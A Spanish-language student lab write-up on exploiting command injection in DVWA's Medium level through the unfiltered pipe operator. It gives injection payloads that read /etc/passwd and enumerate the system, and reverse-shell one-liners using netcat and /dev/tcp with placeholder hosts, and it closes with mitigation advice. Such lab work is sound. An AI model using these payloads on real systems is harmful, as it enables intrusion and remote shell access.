# Inyección de comandos - DVWA

## 1. Descripción de la Vulnerabilidad
La inyección de comandos sucede cuando una aplicación web transmite datos introducidos por el usuario (en este caso, una IP para un comando "**ping**") directamente al shell del S.O sin validación o filtrado suficiente.
En este ejercicio, la aplicación solicita una dirección IP para ejecutar un comando de red estándar (**ping**).

<img width="588" height="284" alt="image" src="https://github.com/user-attachments/assets/ad9b3820-a61f-47fc-a8de-34da40e326ac" />

#### Desafío Nivel Medium
A diferencia del nivel bajo, el nivel Medium intenta implementar una "lista negra" (blacklist) de caracteres peligrosos. El desarrollador utiliza funciones de sustitución en PHP para eliminar operadores que permiten encadenar comandos. Por ejemplo, el código busca bloquear:
* **&&** (Ejecuta el segundo comando solo si el primero tiene éxito).
* **;**  (Finaliza una instrucción y comienza otra).

#### Ejemplo de bloqueo en el código 
**$target = str_replace( '&&', '', $target );**

Esto significa que si escribimos **127.0.0.1 && whoami**, la aplicación lo transforma en **127.0.0.1  whoami**, haciendo que el comando falle por sintaxis incorrecta y no muestre ningún resultado:

<img width="530" height="150" alt="image" src="https://github.com/user-attachments/assets/c217a4d4-5f05-4ae0-abb6-a8f930ca4b00" />

<img width="530" height="150" alt="image" src="https://github.com/user-attachments/assets/554e22f3-54d0-4cb6-aed3-dd3cb8c15772" />

## 2. Análisis del Entorno y Explotación
Para esta práctica, se ha configurado un entorno controlado utilizando una máquina virtual con **Kali Linux** corriendo sobre **VirtualBox**.

#### Identificación de la debilidad
Al analizar la lista negra, se detectó que el desarrollador olvidó filtrar el operador de tubería o "pipe" (**|**). Este operador redirige la salida del primer comando al segundo, o simplemente permite la ejecución secuencial si el primero se interrumpe.

#### Ejecución de Payloads y Validación
Se han validado los siguientes ataques para demostrar que, a pesar del filtrado parcial, el sistema es vulnerable:
| Comando Inyectado | Payload Completo            | Resultado Obtenido                              | Información Crítica Revelada                                  |
|-------------------|----------------------------|------------------------------------------------|---------------------------------------------------------------|
| whoami            | 127.0.0.1 \| whoami        | www-data                                       | Usuario con el que corre el servidor.                        |
| pwd               | 127.0.0.1 \| pwd           | /var/www/html/DVWA/vulnerabilities/exec        | Ruta absoluta del directorio vulnerable.                     |
| ls                | 127.0.0.1 \| ls            | help, index.php, source                        | Estructura interna de archivos del servidor.                 |
| cat /etc/password                | 127.0.0.1 \| cat /etc/password            | Lista de usuarios                       | Extracción de cuentas del sistema(root,bin,etc.).                 |

**Impacto Crítico**: El acceso al archivo **/etc/passwd** permite a un atacante conocer todos los usuarios del sistema, directorios home y shells asignadas, facilitando ataques de fuerza bruta o escalada de privilegios.

#### Otros Payloads Básicos que pueden ser ejecutados son:
* `127.0.0.1 | id`
* `127.0.0.1 | uname -a`
* `127.0.0.1 | ps aux`
* `127.0.0.1 | netstat -anp`

#### Payloads que nos permitirían obtener una shell inversa:
(COnfigurando el listener en un segundo terminal con: `nc -nlvp 4444`)
* `127.0.0.1 | nc YOUR_IP 4444 -e /bin/bash`
* `127.0.0.1 | bash -i >& /dev/tcp/DIRECCIONIP/4444 0>&1`

#### EVIDENCIAS DE LA EJECUCIÓN DE LOS PAYLOADS

<img width="588" height="284" alt="image" src="https://github.com/user-attachments/assets/c84a9aee-5530-46f0-8534-5e1687fbd79a" />

<img width="588" height="284" alt="image" src="https://github.com/user-attachments/assets/88d8e362-bead-4a05-8b56-79a85a901d8d" />

<img width="588" height="284" alt="image" src="https://github.com/user-attachments/assets/9f8f8d5e-b8c0-4cc5-9884-6a00f2d096d4" />

<img width="678" height="553" alt="image" src="https://github.com/user-attachments/assets/2c93a09e-1fa1-4530-b79b-9528e5130572" />

## 3. Mitigación y Buenas Prácticas
Para corregir esta vulnerabilidad y asegurar la puesta en producción según los criterios de evaluación (RA3):
* **Validación de entrada (Saneamiento):** Validar que la entrada sea exclusivamente una dirección IP válida mediante filtros de tipo, no listas negras.
* **Uso de funciones seguras:** Evitar funciones como **shell_exec()** o **system()** que invocan directamente al intérprete de comandos.
* **Principio de Menor Privilegio:** Limitar los permisos del usuario **www-data** para que no tenga acceso de lectura a archivos sensibles del sistema fuera de su entorno de trabajo.

## 4. Bibliografía
Para el desarrollo de esta práctica y la comprensión de las vulnerabilidades en **Damn Vulnerable Web Application (DVWA)**, se han consultado las siguientes fuentes oficiales y recursos de seguridad:
* **Digininja.** (s. f.). *GitHub digininja/DVWA: Damn Vulnerable Web Application (DVWA)*. https://github.com/digininja/DVWA.
* **Sama, A.** (s. f.). *DVWA writeups.* https://aftabsama.com/writeups/dvwa/.
* **Documentación de la Unidad:** Ciberseguridad en entornos de las tecnologías de la información: Puesta en producción segura.
